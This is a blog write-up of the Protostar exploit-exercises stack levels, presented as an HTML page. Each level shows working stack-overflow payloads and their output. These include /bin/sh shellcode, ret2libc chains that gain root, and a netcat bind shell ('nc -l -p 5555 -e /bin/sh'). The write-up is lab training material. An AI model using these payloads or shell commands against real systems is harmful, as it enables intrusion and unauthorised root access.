@@ -1,0 +1,444 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Protostar solutions - Stack Levels - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Part two of the three exploit exercises available. This set of challenges focused purely on memory corruption via stack overflows; the challenges &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Protostar Solutions - Stack Levels</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-31T00:21:16-06:00" pubdate data-updated="true">Mar 31<span>st</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Part two of the three <a href="http://exploit-exercises.com/">exploit exercises</a> available.  This set of challenges focused purely on memory corruption via stack overflows; the challenges here weren&rsquo;t too difficult, but I wanted to work through them anyway.  A post with the remaining levels will follow.</p>
+
+<h3>Stack Level 00</h3>
+
+
+<p>Introductory level that introduces stack layout; here, the <code>modified</code> variable follows a 64 byte array on the stack.  If the stack is overwritten, the modified variable will be run over.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ python -c "print 'A'*70" | ./stack0 
+</span><span class='line'>you have changed the 'modified' variable
+</span><span class='line'>user@protostar:~$</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<h3>Stack Level 01</h3>
+
+
+<p>Another introductory level that forces you to overwrite a particular variable with a specific value.  Essentially we need to take level 00 and figure out exactly where to overwrite the modified variable.  This can be trivially guessed, considering we know the buf size.  Remembering that this architecture is little endian:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ./stack1 $(perl -e 'print "A"x64 . "dcba"')
+</span><span class='line'>you have correctly got the variable to the right value
+</span><span class='line'>user@protostar:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s also worth noting that, if you&rsquo;re loading this into gdb, the modified variable is volatile, so if you <code>p &amp;modified</code> and don&rsquo;t get the right value, don&rsquo;t worry.  You&rsquo;re not crazy.</p>
+
+<h3>Stack Level 02</h3>
+
+
+<p>Almost a carbon copy of level 1, except this time our input vector is an environmental variable.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ export GREENIE=$(perl -e 'print "A"x64 . "\x0a\x0d\x0a\x0d"')
+</span><span class='line'>user@protostar:~$ ./stack2
+</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<h3>Stack Level 03</h3>
+
+
+<p>This level has us redirecting code flow to another function present in the source.  The buffer length is the same as the previous three, so we just need to find out where the function lies.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -d stack3 | grep win
+</span><span class='line'>08048424 &lt;win&gt;:
+</span><span class='line'>user@protostar:~$ echo $(perl -e 'print "A"x64 . "\x24\x84\x04\x08"') | ./stack3
+</span><span class='line'>calling function pointer, jumping to 0x08048424
+</span><span class='line'>code flow successfully changed
+</span><span class='line'>user@protostar:~$ </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<h3>Stack Level 04</h3>
+
+
+<p>Instead of overwriting a function call, we&rsquo;ll be overwriting a return address.  When the function exits, it pops the current stack frame off and returns the saved frame pointer, so we need only overflow the address immediately following EBP.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -d stack4 | grep win
+</span><span class='line'>080483f4 &lt;win&gt;:
+</span><span class='line'>user@protostar:~$ perl -e 'print "A"x76 . "\xf4\x83\x04\x08"' | ./stack4 
+</span><span class='line'>code flow successfully changed
+</span><span class='line'>Segmentation fault
+</span><span class='line'>user@protostar:~$ </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<h3>Stack Level 05</h3>
+
+
+<p>There&rsquo;s no real flag here aside from getting a shell, so we&rsquo;ll need some shellcode now.  Disclaimer: I spent a good deal of time trying to get shellcode working for this, and would continually brick wall at the same spot:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) ni
+</span><span class='line'>Executing new program: /bin/dash
+</span><span class='line'>Error in re-setting breakpoint 1: Function "main" not defined.
+</span><span class='line'>
+</span><span class='line'>Program exited normally.
+</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
+
+
+<p>During one of my googling escapades, I haphazardly clicked <a href="http://www.mattandreko.com/2011/12/exploit-exercises-protostar-stack-5.html">this</a> link from someone having the exact same issues with this level.  What should be a very simple buffer overflow turned into a very wonky, absurd tumble through some obscure shellcode issues.  In the end, I came up with this solution:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x76 . "\x80\xf7\xff\xbf" . "\x90"x9 . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./stack5 
+</span><span class='line'># whoami
+</span><span class='line'>root
+</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<h3>Stack Level 06</h3>
+
+
+<p>This level forces us to place our shellcode in a specific path; i.e. out of userland.  We can&rsquo;t just stick it onto the stack, and we can&rsquo;t place it in an environmental variable.  Instead, we must use ret2[libc|strcpy|gets|etc] or ROP.  It verifies the function&rsquo;s return address by calling <code>__built_return_address(0)</code>, which will return the current function&rsquo;s return address.</p>
+
+<p>This one was pretty fun, as I was able to leverage the ret2libc to pull it off.  I used c0ntext&rsquo;s <a href="http://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf">ret2libc</a> demonstration paper as reference.  I based most of my work off the previous level, and modified it only by adding system() and exit() addresses.  My payload in the end looked like this:</p>
+
+<p><code>[80 bytes junk | system() address | exit() address | command]</code></p>
+
+<p>For this example, I have my command stashed in the GETME environmental variable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ export GETME=/bin/sh
+</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x86\xff\xff\xbf";' | ./stack6
+</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췆���
+</span><span class='line'>user@protostar:/opt/protostar/bin$ export GETME=/usr/bin/whoami
+</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x80\xff\xff\xbf";' | ./stack6
+</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췀���
+</span><span class='line'>root
+</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>I wasn&rsquo;t able to get /bin/sh launched with a system() call, and after checking the man page, it appears that system drops root privileges.  My second thought was to simply open up a reverse shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ export GETME="/bin/nc -l -p 5555 -e /bin/sh"
+</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x72\xff\xff\xbf";' | ./stack6
+</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`��r���</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I now had a root shell listening on port 5555.</p>
+
+<h3>Stack Level 07</h3>
+
+
+<p>The final stack level is almost exactly like the previous level, however this time when it returns from getpath(), it returns strdup(buffer), which returns a pointer to a duplicate string of buffer.  The address range is also now much more restrictive; disabling any address matching 0xb0000000.  The exploit page notes that we should be thinking about a ret2text to exploit this, so I started thinking of ways to ret2plt or ret2dl-resolve, but in the end decided those were likely too advanced for such a simple level.  Instead, I objdump&rsquo;d the binary in search of a POP POP RET, which would bypass the addressing filter and allow me to take control over EIP.  The first one I found was at <code>0x8048492</code>.  After some twiddling, I discovered the following would lead me to code execution: <code>perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8' . "\xcc"x16 | ./stack7</code>.  So the payload will look like this <code>[80 bytes junk | POP POP RET | 8 bytes junk | shellcode]</code></p>
+
+<p>I dumped the shellcode from level 5 into this, but for some reason the shell would only spawn if running in gdb:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8 . "\xac\xf7\xff\xbf" . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' &gt; /tmp/input
+</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb ./stack7
+</span><span class='line'>Reading symbols from /opt/protostar/bin/stack7...done.
+</span><span class='line'>(gdb) r &lt; /tmp/input
+</span><span class='line'>Starting program: /opt/protostar/bin/stack7 &lt; /tmp/input
+</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� '�̀1�Ph//shh/bin��PS�ᙰ
+</span><span class='line'>
+</span><span class='line'>Executing new program: /bin/dash
+</span><span class='line'>$ exit
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input
+</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� '�̀1�Ph//shh/bin��PS�ᙰ
+</span><span class='line'>
+</span><span class='line'>Segmentation fault
+</span><span class='line'>user@protostar:/opt/protostar/bin$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Where <code>\xac\xf7\xff\xbf</code> is the address of shellcode.  Instead I threw shellcode into an environmental variable and leveraged Jon Ericson&rsquo;s getenvaddr application to find the offset:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ export GETME=`perl -e 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+</span><span class='line'>user@protostar:/opt/protostar/bin$ /tmp/test GETME ./stack7
+</span><span class='line'>GETME will be at 0xbfffff58
+</span><span class='line'>user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8 . "\x58\xff\xff\xbf"' &gt; /tmp/input
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input 
+</span><span class='line'>input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA����������X���
+</span><span class='line'># whoami
+</span><span class='line'>root
+</span><span class='line'># </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Overall these levels were pretty basic, but I&rsquo;m looking forward to digging into Fusion for more advanced flags.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-31T00:21:16-06:00" pubdate data-updated="true">Mar 31<span>st</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/protostar/'>protostar</a>, <a class='category' href='/blog/categories/stack/'>stack</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2012/08/09/solving-pwn0s-v2/" title="Previous Post: solving pwn0s v2">&laquo; solving pwn0s v2</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/04/03/solving-brainpan/" title="Next Post: solving brainpan">solving brainpan &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/24/ganib-project-management-2.3-sqli/">ganib project management 2.3 SQLi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/">Fetching JBoss MBean method hashes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/">Dolibarr 3.4.0 - Multiple Vulnerabilities</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/">OpenEMM-2013 SOAP SQLi/Stored XSS</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
